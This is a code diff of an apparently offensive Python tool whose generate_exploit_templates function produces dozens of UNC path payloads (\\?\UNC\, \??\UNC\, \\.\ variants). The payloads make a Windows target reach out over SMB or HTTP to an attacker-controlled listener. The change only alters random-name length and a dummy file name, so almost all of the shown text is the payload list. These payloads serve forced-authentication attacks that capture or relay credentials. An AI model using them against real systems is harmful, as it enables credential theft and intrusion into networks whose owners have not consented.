@@ -9,7 +9,7 @@ import random
 import jinja2
 
 
-def gen_random_name(length=8):
+def gen_random_name(length=4):
     alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     name = ""
     for k in range(length):
@@ -24,46 +24,46 @@ def generate_exploit_templates(desired_auth_type=None):
         # Only ip
         ("smb", '{{listener}}\x00'),
         # SMB
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\{{listener}}{{smb_listen_port}}\x00'),
         # SMB path with ?
-        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\x00'),
         # SMB path with .
-        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with ?
-        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with ??
-        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\aa\x00'),
-        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\aa\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\??\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with .
-        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(4)}}\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
         ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
         # HTTP
-        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\File.txt\x00'),
-        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
-        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(4)}}\\smile.txt\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(4)}}\\\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(4)}}\x00'),
         ("http", '\\\\{{listener}}{{http_listen_port}}\\\x00'),
         ("http", '\\\\{{listener}}{{http_listen_port}}\x00')
     ]
